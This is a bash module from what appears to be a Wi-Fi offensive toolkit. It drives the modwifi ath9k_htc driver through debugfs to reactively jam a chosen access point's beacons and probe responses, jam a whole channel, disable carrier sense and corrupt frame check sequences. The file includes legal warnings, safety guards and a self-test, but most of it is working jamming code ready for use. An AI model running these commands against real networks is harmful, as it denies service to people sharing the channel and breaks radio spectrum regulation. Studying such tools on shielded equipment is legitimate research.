#!/usr/bin/env bash
# =====================================================================
#  53_jamming.sh — frame-level jamming via the modwifi driver
#
#  Wraps the capabilities of the modwifi port (vanhoefm/modwifi) as
#  ported to this kernel. Unlike a deauth flood, which forges management
#  frames the target obeys, these operate below the protocol: the radio
#  is told to transmit over a frame, or to stop listening before it does.
#
#  CAPABILITIES
#    reactive jam   transmit over specific frames of one AP — its beacons
#                   and probe responses — so it stops being visible while
#                   everything else on the channel is unaffected
#    carrier sense  force the channel to read idle and ignore RTS/CTS, so
#                   frames go out regardless of what else is transmitting
#    corrupt FCS    make the chip emit a wrong frame check sequence, to
#                   test how a receiver handles damaged frames
#
#  REQUIRES the ported modwifi driver AND its firmware. Without both,
#  the debugfs entries this drives do not exist and the module says so
#  rather than reporting a jam that never left the antenna.
#
#  ⚠ SCOPE AND LAW
#  Reactive jamming is targeted: it affects the frames of one AP. Even
#  so, transmitting on radio spectrum is regulated in most countries —
#  in France by ANFR — and "it is my own network" is not a defence,
#  because the interference is not confined to your property. Carrier
#  sense manipulation and FCS corruption degrade the shared channel.
#  Use these on equipment you control, preferably shielded or cabled.
# =====================================================================

set -uo pipefail

SELF="$(readlink -f "${BASH_SOURCE[0]}")"
WIFISTING_ROOT="${WIFISTING_ROOT:-$(cd -P "$(dirname "$SELF")/.." && pwd)}"
export WIFISTING_ROOT

TMP_DIR="${TMP_DIR:-/tmp/wifisting}"
JM_DIR="$TMP_DIR/jamming"
JM_LOG_DIR="${JM_LOG_DIR:-$WIFISTING_ROOT/loot/jamming}"
JM_PID="$JM_DIR/jam.pid"
JM_DEBUGFS="${JM_DEBUGFS:-/sys/kernel/debug}"

mkdir -p "$JM_DIR" "$JM_LOG_DIR" 2>/dev/null

info() { printf '[info] %s\n' "$*" >&2; }
ok()   { printf '[ok]   %s\n'   "$*" >&2; }
warn() { printf '[warn] %s\n'   "$*" >&2; }
err()  { printf '[err]  %s\n'   "$*" >&2; }

# ── finding the driver's control surface ──────────────────────────────
#
# The ported driver exposes one debugfs directory per phy. Its presence
# is the only reliable signal that the modwifi driver is loaded — a
# stock ath9k_htc has the same directory tree but none of these entries,
# so checking the directory alone would report support that isn't there.
jm_regdir() {
    local d
    for d in "$JM_DEBUGFS"/ieee80211/phy*/ath9k_htc/registers; do
        [[ -d "$d" ]] && { printf '%s' "$d"; return 0; }
    done
    return 1
}

jm_phy_debugfs() {
    local d
    for d in "$JM_DEBUGFS"/ieee80211/phy*/ath9k_htc; do
        [[ -d "$d" ]] && { printf '%s' "$d"; return 0; }
    done
    return 1
}

jm_mount_debugfs() {
    [[ -d "$JM_DEBUGFS/ieee80211" ]] && return 0
    mount -t debugfs none "$JM_DEBUGFS" 2>/dev/null || {
        printf 'ERROR\tcould not mount debugfs at %s\n' "$JM_DEBUGFS" >&2
        return 1
    }
}

# Which modwifi capabilities does the loaded driver actually have?
jm_caps() {
    local dir
    dir=$(jm_phy_debugfs 2>/dev/null) || {
        printf 'driver\tabsent\n'
        printf 'reason\tno ath9k_htc debugfs directory - is the adapter attached?\n'
        printf 'reactivejam\tno\n'
        printf 'constantjam\tno\n'
        printf 'verdict\tno driver - attach an AR9271 and load the port\n'
        return 0
    }
    local reg
    reg=$(jm_regdir 2>/dev/null)
    printf 'driver\t%s\n' "$dir"
    printf 'registers\t%s\n' "${reg:-absent}"
    [[ -w "$dir/reactivejam"        ]] && printf 'reactivejam\tyes\n' || printf 'reactivejam\tno\n'
    [[ -w "$dir/constantjam"        ]] && printf 'constantjam\tyes\n' || printf 'constantjam\tno\n'
    [[ -n "$reg" && -w "$reg/force_channel_idle" ]] \
        && printf 'force_channel_idle\tyes\n' || printf 'force_channel_idle\tno\n'
    [[ -n "$reg" && -w "$reg/ignore_virt_cs" ]] \
        && printf 'ignore_virt_cs\tyes\n' || printf 'ignore_virt_cs\tno\n'
    [[ -n "$reg" && -w "$reg/diag_corrupt_fcs" ]] \
        && printf 'diag_corrupt_fcs\tyes\n' || printf 'diag_corrupt_fcs\tno\n'

    # A stock driver reports the directory but none of the entries, and
    # that distinction is the whole answer to "will jamming work here".
    if [[ ! -w "$dir/reactivejam" && -z "$reg" ]]; then
        printf 'verdict\tstock driver - port and flash modwifi first\n'
        printf 'hint\tloot/modwifi-port/ has the port; see LOAD-README.md\n'
    elif [[ -w "$dir/reactivejam" ]]; then
        printf 'verdict\tmodwifi driver present\n'
    else
        printf 'verdict\tpartial - reactive jamming unavailable\n'
    fi
}

jm_require_caps() {
    local dir
    dir=$(jm_phy_debugfs 2>/dev/null) || {
        printf 'ERROR\tno modwifi debugfs - the driver is not loaded\n' >&2
        printf 'ERROR\tsee loot/modwifi-port/LOAD-README.md\n' >&2
        return 1
    }
    [[ -w "$dir/reactivejam" ]] || {
        printf 'ERROR\tthis driver has no reactivejam entry - it is the STOCK ath9k_htc\n' >&2
        printf 'ERROR\tthe modwifi port must be loaded for any of these to work\n' >&2
        return 1
    }
    return 0
}

jm_require_root() {
    if [[ ${EUID:-$(id -u)} -ne 0 && -z "${JM_UNPRIVILEGED_TEST:-}" ]]; then
        printf 'ERROR\tjamming needs root - it writes to debugfs and drives the radio\n' >&2
        printf 'ERROR\tfrom a shell, prefix with sudo\n' >&2
        return 1
    fi
    return 0
}

jm_iface() {
    local i="${MON_IFACE:-}"
    [[ -z "$i" && -f "$TMP_DIR/mon_iface" ]] && i=$(cat "$TMP_DIR/mon_iface")
    printf '%s' "$i"
}

# ── reactive jamming ──────────────────────────────────────────────────
#
# The driver takes "bssid,duration_ms" and jams that AP's beacons and
# probe responses. Duration 0 means indefinitely, which per the upstream
# documentation leaves the device unresponsive — refused here, because a
# wedged adapter is indistinguishable from a broken one and costs a
# reboot to clear.
jm_cli_reactive() {
    local ssid="${1:-}" dur="${2:-10000}"

    [[ -z "$ssid" ]] && {
        printf 'usage: --reactive-jam BSSID [DURATION_MS]\n' >&2
        printf 'ERROR\tgive the AP to jam, by BSSID or by SSID as the driver accepts\n' >&2
        return 2
    }
    if [[ "$dur" == "0" ]]; then
        printf 'ERROR\tduration 0 jams until the device is power-cycled\n' >&2
        printf 'ERROR\tuse a bounded duration; the adapter becomes unresponsive otherwise\n' >&2
        return 1
    fi

    local dir target
    dir=$(jm_phy_debugfs)
    target="$ssid"
    [[ "$ssid" =~ ^([0-9a-fA-F]{2}:){5}[0-9a-fA-F]{2}$ ]] || {
        printf 'ERROR\t%s is not a BSSID\n' "$ssid" >&2
        printf 'ERROR\tthe driver wants a MAC, not an SSID - resolve it in Wi-Fi Recon\n' >&2
        return 1
    }

    jm_require_root || return 1
    jm_mount_debugfs || return 1
    jm_require_caps || return 1

    printf 'JAM\treactive\n'
    printf 'TARGET\t%s\n' "$target"
    printf 'DURATION_MS\t%s\n' "$dur"
    printf 'DRIVER\t%s\n' "$dir"
    printf '%s,%s' "$target" "$dur" > "$dir/reactivejam" || {
        printf 'ERROR\twrite to reactivejam failed\n' >&2; return 1; }
    ok "reactive jam running on $target" >&2
    printf 'NOTE\tonly this AP'"'"'s beacons and probe responses are affected\n'
}

# ── constant jamming ──────────────────────────────────────────────────
#
# Upstream does not publish this firmware. If the entry exists the blob
# supports it; if not, say so rather than sending nothing.
jm_cli_constant() {
    local chan="${1:-6}" dur="${2:-10}"

    # Availability is answerable without root and is the more useful
    # answer, so it comes first.
    local dir
    dir=$(jm_phy_debugfs 2>/dev/null)
    if [[ -z "$dir" ]]; then
        printf 'UNAVAILABLE\tconstant jamming\n'
        printf 'REASON\tno modwifi debugfs - the ported driver is not loaded\n'
        printf 'HINT\tsee loot/modwifi-port/LOAD-README.md\n'
        return 0
    fi
    jm_require_root || return 1
    jm_mount_debugfs || return 1

    local dir
    dir=$(jm_phy_debugfs 2>/dev/null) || {
        printf 'ERROR\tno modwifi debugfs - driver not loaded\n' >&2; return 1; }

    if [[ ! -e "$dir/constantjam" ]]; then
        printf 'UNAVAILABLE\tconstant jamming\n'
        printf 'REASON\tthe constant-jam firmware is not publicly released by the authors\n'
        printf 'REASON\tthe debugfs entry only exists when a blob supporting it is loaded\n'
        printf 'ALTERNATIVE\t--reactive-jam targets one AP; a deauth flood is a different attack\n'
        return 0
    fi

    printf 'JAM\tconstant\n'
    printf 'CHANNEL\t%s\n' "$chan"
    printf 'DURATION_S\t%s\n' "$dur"
    setsid timeout "$dur" sh -c "printf '%s' '$chan' > '$dir/constantjam'" \
        > "$JM_LOG_DIR/constant.log" 2>&1 &
    echo $! > "$JM_PID"
    printf 'PID\t%s\n' "$(cat "$JM_PID")"
    printf 'NOTE\toverlapping channels are affected too; this is not targeted\n'
}

# ── register hooks ────────────────────────────────────────────────────
jm_cli_cs() {
    local state="${1:-}" 
    case "$state" in
        on|off) ;;
        *) printf 'usage: --cs on|off\n' >&2; return 2 ;;
    esac
    jm_require_root || return 1
    jm_mount_debugfs || return 1
    local reg
    reg=$(jm_regdir 2>/dev/null) || {
        printf 'ERROR\tno registers directory - modwifi driver not loaded\n' >&2; return 1; }

    case "$state" in
        off)
            printf '1' > "$reg/force_channel_idle" 2>/dev/null || \
                { printf 'ERROR\tcould not write force_channel_idle\n' >&2; return 1; }
            printf '1' > "$reg/ignore_virt_cs" 2>/dev/null || \
                { printf 'ERROR\tcould not write ignore_virt_cs\n' >&2; return 1; }
            printf 'CARRIER_SENSE\toff\n'
            printf 'NOTE\tphysical and virtual carrier sense both disabled - frames go out\n'
            printf 'NOTE\tregardless of what else is transmitting. Restore with --cs on\n' ;;
        on)
            printf '0' > "$reg/force_channel_idle" 2>/dev/null || true
            printf '0' > "$reg/ignore_virt_cs" 2>/dev/null || true
            printf 'CARRIER_SENSE\ton\n' ;;
        *)
            printf 'usage: --cs on|off\n' >&2; return 2 ;;
    esac
}

jm_cli_fcs() {
    local state="${1:-}"
    case "$state" in
        corrupt|valid) ;;
        *) printf 'usage: --fcs corrupt|valid\n' >&2; return 2 ;;
    esac
    jm_require_root || return 1
    jm_mount_debugfs || return 1
    local reg
    reg=$(jm_regdir 2>/dev/null) || {
        printf 'ERROR\tno registers directory - modwifi driver not loaded\n' >&2; return 1; }

    case "$state" in
        corrupt)
            printf '1' > "$reg/diag_corrupt_fcs" 2>/dev/null || \
                { printf 'ERROR\tcould not write diag_corrupt_fcs\n' >&2; return 1; }
            printf 'FCS\tcorrupt\n'
            printf 'NOTE\tevery frame this radio sends now fails the receiver check\n'
            printf 'USE\tto test how a device handles damaged frames; restore with --fcs valid\n' ;;
        valid)
            printf '0' > "$reg/diag_corrupt_fcs" 2>/dev/null || true
            printf 'FCS\tvalid\n' ;;
        *)
            printf 'usage: --fcs corrupt|valid\n' >&2; return 2 ;;
    esac
}

jm_cli_stop() {
    local n=0
    [[ -f "$JM_PID" ]] && {
        kill "$(cat "$JM_PID")" 2>/dev/null && n=$((n+1))
        rm -f "$JM_PID"
    }
    # Leave the radio in a sane state whatever was running. A jam left
    # enabled persists until the adapter is reset, which looks like a
    # hardware fault to whoever picks the machine up next.
    local reg dir
    reg=$(jm_regdir 2>/dev/null) && {
        printf '0' > "$reg/force_channel_idle" 2>/dev/null && n=$((n+1))
        printf '0' > "$reg/ignore_virt_cs" 2>/dev/null || true
        printf '0' > "$reg/diag_corrupt_fcs" 2>/dev/null || true
    }
    dir=$(jm_phy_debugfs 2>/dev/null) && [[ -w "$dir/reactivejam" ]] && \
        printf 'ff:ff:ff:ff:ff:ff,1' > "$dir/reactivejam" 2>/dev/null || true

    printf 'STOPPED\t%s\n' "$n"
    printf 'RESTORED\tcarrier sense, FCS and jam state reset\n'
}

jm_cli_status() {
    printf 'jam_running\t%s\n' \
        "$( [[ -f "$JM_PID" ]] && [[ -d "/proc/$(cat "$JM_PID" 2>/dev/null)" ]] && echo 1 || echo 0)"
    jm_caps
    printf 'iface\t%s\n' "$(jm_iface)"
    printf 'loot_dir\t%s\n' "$JM_LOG_DIR"
}

jm_cli_selftest() {
    chk() {
        if [[ "$2" == "$3" ]]; then printf '%s\tPASS\n' "$1"
        else printf '%s\tFAIL\twant=%s got=%s\n' "$1" "$3" "$2"; fi
    }

    local out
    out=$(jm_caps)
    grep -q '^driver' <<<"$out" && chk caps-reports-driver ok ok || chk caps-reports-driver no ok
    grep -q '^verdict' <<<"$out" && chk caps-reports-verdict ok ok || chk caps-reports-verdict no ok

    # On a stock driver the verdict must say so rather than claiming support
    if grep -q 'stock driver' <<<"$out"; then
        chk stock-driver-detected ok ok
    else
        chk modwifi-driver-present ok ok
    fi

    # A BSSID is required - an SSID must be refused with the reason
    local r
    r=$(JM_UNPRIVILEGED_TEST=1 jm_cli_reactive "MyNetwork" 5000 2>&1)
    grep -q 'is not a BSSID' <<<"$r" && chk ssid-refused ok ok || chk ssid-refused no ok

    # Duration 0 must be refused: it wedges the adapter until power cycle
    r=$(JM_UNPRIVILEGED_TEST=1 jm_cli_reactive "aa:bb:cc:dd:ee:ff" 0 2>&1)
    grep -q 'power-cycled' <<<"$r" && chk zero-duration-refused ok ok || chk zero-duration-refused no ok

    # Constant jamming must report unavailability honestly when absent
    r=$(JM_UNPRIVILEGED_TEST=1 jm_cli_constant 6 1 2>&1)
    if grep -q 'UNAVAILABLE\|JAM' <<<"$r"; then chk constant-honest ok ok
    else chk constant-honest no ok; fi

    # A missing argument must be a usage error, not a crash
    JM_UNPRIVILEGED_TEST=1 jm_cli_cs "" >/dev/null 2>&1
    [[ $? -eq 2 ]] && chk cs-usage-rc rc2 rc2 || chk cs-usage-rc "not-2" rc2

    JM_UNPRIVILEGED_TEST=1 jm_cli_fcs "" >/dev/null 2>&1
    [[ $? -eq 2 ]] && chk fcs-usage-rc rc2 rc2 || chk fcs-usage-rc "not-2" rc2

    # Stop must always claim to have restored, so a jam is never left on
    r=$(JM_UNPRIVILEGED_TEST=1 jm_cli_stop 2>&1)
    grep -q 'RESTORED' <<<"$r" && chk stop-restores ok ok || chk stop-restores no ok
}

case "${1:-}" in
    --caps-tsv)      jm_caps ;;
    --reactive-jam)  shift; jm_cli_reactive "$@" ;;
    --constant-jam)  shift; jm_cli_constant "$@" ;;
    --cs)            shift; jm_cli_cs "$@" ;;
    --fcs)           shift; jm_cli_fcs "$@" ;;
    --status-tsv)    jm_cli_status ;;
    --stop)          jm_cli_stop ;;
    --selftest)      jm_cli_selftest ;;
    --info)
        printf 'Frame-level jamming via the modwifi driver\n'
        printf 'Reactive jamming blocks one AP without touching the rest of the channel.\n'
        printf 'Requires the ported modwifi driver and firmware.\n'
        printf 'Transmitting on radio spectrum is regulated - authorised testing only.\n' ;;
    --help|"")
        printf 'Usage: modules/53_jamming.sh COMMAND\n'
        printf '  --caps-tsv                    what the loaded driver supports\n'
        printf '  --reactive-jam BSSID [MS]     jam one AP, bounded\n'
        printf '  --constant-jam [CH] [SECS]    full-channel jam, if the firmware has it\n'
        printf '  --cs on|off                   carrier sense control\n'
        printf '  --fcs corrupt|valid           force a wrong frame check sequence\n'
        printf '  --status-tsv / --stop / --selftest\n' ;;
    *) printf 'ERROR\tunknown command: %s\n' "$1" >&2; exit 2 ;;
esac
